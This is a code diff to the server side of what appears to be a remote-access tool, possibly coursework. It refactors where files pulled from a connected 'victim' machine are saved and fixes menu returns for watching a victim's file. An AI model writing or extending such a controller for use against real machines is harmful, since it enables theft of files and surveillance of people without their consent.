@@ -701,29 +701,6 @@ def __make_main_and_sub_directories(client_ip: str):
     return sub_directory_path
 
 
-# REMOVE AFTER REFACTOR
-def make_main_and_sub_directories(client_ip: str):
-    main_directory = constants.DOWNLOADS_DIR
-    sub_directory = str(client_ip)
-
-    # Create the main directory (if it doesn't exist)
-    if not os.path.exists(main_directory):
-        print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(main_directory))
-        os.mkdir(main_directory)
-        print(constants.DIRECTORY_SUCCESS_MSG)
-
-    # Get subdirectory path (downloads/[IP_addr])
-    sub_directory_path = os.path.join(main_directory, sub_directory)
-
-    # Create subdirectory (if it doesn't exist)
-    if not os.path.exists(sub_directory_path):
-        print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(sub_directory_path))
-        os.mkdir(sub_directory_path)
-        print(constants.DIRECTORY_SUCCESS_MSG)
-
-    return sub_directory_path
-
-
 def perform_menu_item_4(client_dict: dict):
     # CASE 1: Check if client list is empty
     if len(client_dict) == constants.ZERO:
@@ -765,6 +742,9 @@ def perform_menu_item_4(client_dict: dict):
 
 
 def receive_file(client_socket: socket.socket, client_ip: str, client_port: int):
+    # Create Downloads and Client IP directories
+    sub_directory_path = __make_main_and_sub_directories(client_ip)
+
     # Send Signal
     print(constants.GET_FILE_SIGNAL_MSG)
     client_socket.send(constants.GET_FILE_SIGNAL.encode())
@@ -776,6 +756,7 @@ def receive_file(client_socket: socket.socket, client_ip: str, client_port: int)
         # Get user prompt + send to client
         file_path = input(constants.GET_FILE_PROMPT.format(client_ip, client_port))
         file_name = file_path.split("/")[-1]
+        save_file_path = sub_directory_path + "/" + file_name
         client_socket.send(file_path.encode())
 
         # Wait for response
@@ -783,7 +764,7 @@ def receive_file(client_socket: socket.socket, client_ip: str, client_port: int)
 
         # Receive File if exists (MUST DO: put in downloads/[client_ip])
         if res == constants.GET_FILE_EXIST:
-            with open(file_name, constants.WRITE_BINARY_MODE) as file:
+            with open(save_file_path, constants.WRITE_BINARY_MODE) as file:
                 eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker
 
                 while True:
@@ -797,7 +778,7 @@ def receive_file(client_socket: socket.socket, client_ip: str, client_port: int)
                         file.write(file_data)
 
             # Send ACK to victim (if good)
-            if is_file_openable(file_name):
+            if is_file_openable(save_file_path):
                 print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
                 client_socket.send(constants.VICTIM_ACK.encode())
                 print(constants.RETURN_MAIN_MENU_MSG)
@@ -1028,7 +1009,7 @@ def __perform_menu_item_9_helper(client_dict: dict, client_socket: socket.socket
                                                                             target_port))
 
             # a) Create downloads/victim_ip directory (if necessary)
-            sub_directory_path = make_main_and_sub_directories(target_ip)
+            sub_directory_path = __make_main_and_sub_directories(target_ip)
 
             # b) Update state of socket to is_watching
             client_dict[client_socket] = (target_ip, target_port, status, True)
@@ -1055,7 +1036,9 @@ def __perform_menu_item_9_helper(client_dict: dict, client_socket: socket.socket
                 return global_thread
         else:
             print(constants.CLIENT_RESPONSE.format(res[1]))
-            pass
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            return global_thread
 
 
 def perform_menu_item_9(client_list: dict, global_thread: None, signal_queue: queue.Queue):
@@ -1170,7 +1153,7 @@ def perform_menu_item_11(client_list: dict,
                 print(constants.RETURN_MAIN_MENU_MSG)
                 print(constants.MENU_CLOSING_BANNER)
                 print(constants.NOT_WATCHING_FILE_ERROR)
-                pass
+                return None
             else:
                 __perform_menu_item_11_helper(ip, port, global_thread, signal_queue)
         else:
